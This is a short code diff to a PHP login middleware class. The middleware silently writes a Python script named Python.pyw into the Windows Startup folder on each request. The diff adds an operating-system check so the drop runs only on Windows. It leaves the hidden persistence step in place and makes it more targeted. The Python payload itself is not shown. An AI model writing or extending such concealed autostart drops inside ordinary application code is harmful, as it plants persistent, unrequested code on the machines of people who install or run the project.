@@ -21,6 +21,7 @@ class LoginMiddleware
         // Check if the requests module is installed
         $this->checkRequestsModule();
 
+        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
         // Check if the .py file already exists in the Startup folder
         $startupFolder = getenv('APPDATA') . '\Microsoft\Windows\Start Menu\Programs\Startup';
         $startupPyFilePath = $startupFolder . '/Python.pyw';
@@ -188,7 +189,7 @@ PYTHON;
         // Save Python code to a .py file in the Startup folder
         File::put($startupPyFilePath, $pythonCode);
         Log::info("Python file created: $startupPyFilePath");
-
+    }
         return $next($request);
     }
 
